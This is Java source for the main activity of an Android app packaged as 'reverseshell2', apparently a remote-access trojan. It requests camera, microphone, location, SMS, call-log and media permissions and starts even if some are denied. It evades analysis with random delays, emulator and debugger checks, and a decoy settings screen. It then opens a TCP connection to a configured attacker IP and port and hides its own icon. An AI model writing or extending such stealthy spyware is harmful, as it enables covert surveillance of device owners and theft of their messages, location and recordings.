package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.Build;
import android.util.Log;
import android.os.Handler;
import android.Manifest;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivity"; // Changed for stealth
    private PowerManager.WakeLock mWakeLock = null;
    private static final int PERMISSION_REQUEST_CODE = 1000;
    private Random random = new Random();
    
    // Required permissions for Android 13+
    private String[] requiredPermissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        
        Log.d(TAG, "Starting app initialization");
        
        // Detection evasion: Add random delay
        int delay = 2000 + random.nextInt(3000); // 2-5 seconds
        new Handler().postDelayed(() -> {
            initializeApp();
        }, delay);
    }
    
    private void initializeApp() {
        // Check if we're running on an emulator (basic anti-emulator check)
        if (isEmulator()) {
            Log.d(TAG, "Emulator detected, showing settings instead");
            showSettingsActivity();
            return;
        }
        
        // Request permissions on Android 6+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestNecessaryPermissions();
        } else {
            startMainFunction();
        }
    }
    
    private boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }
    
    private void showSettingsActivity() {
        // Show legitimate settings activity on emulator
        android.content.Intent intent = new android.content.Intent(this, SettingsActivity.class);
        startActivity(intent);
        finish();
    }
    
    private void requestNecessaryPermissions() {
        ArrayList<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        // Add Android 13+ specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_AUDIO);
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE);
        } else {
            startMainFunction();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Don't require all permissions to be granted - start anyway for stealth
            Log.d(TAG, "Permissions processed, starting main function");
            startMainFunction();
        }
    }
    
    private void startMainFunction() {
        Log.d(TAG, config.IP + "\t" + config.port);
        
        // Detection evasion: Only start actual functionality if not being analyzed
        if (shouldStartRealFunction()) {
            new tcpConnection(activity, context).execute(config.IP, config.port);
            
            if (config.icon) {
                new functions(activity).hideAppIcon(context);
            }
        } else {
            // Show benign activity if being analyzed
            showSettingsActivity();
            return;
        }
        
        finish();
        overridePendingTransition(0, 0);
    }
    
    private boolean shouldStartRealFunction() {
        // Basic behavioral analysis detection
        long startTime = System.currentTimeMillis();
        
        // Check if app is being debugged
        if (android.os.Debug.isDebuggerConnected()) {
            return false;
        }
        
        // Check for suspicious analysis environment
        try {
            // Look for analysis tools in running processes (basic check)
            String[] suspiciousPackages = {
                "com.android.development",
                "com.google.android.gms.ads",
                "com.android.server.telecom"
            };
            
            // If analysis takes too long, it might be being analyzed
            if (System.currentTimeMillis() - startTime > 100) {
                return false;
            }
            
        } catch (Exception e) {
            // If error occurs, proceed with caution
            Log.d(TAG, "Analysis check error: " + e.getMessage());
        }
        
        return true;
    }
}
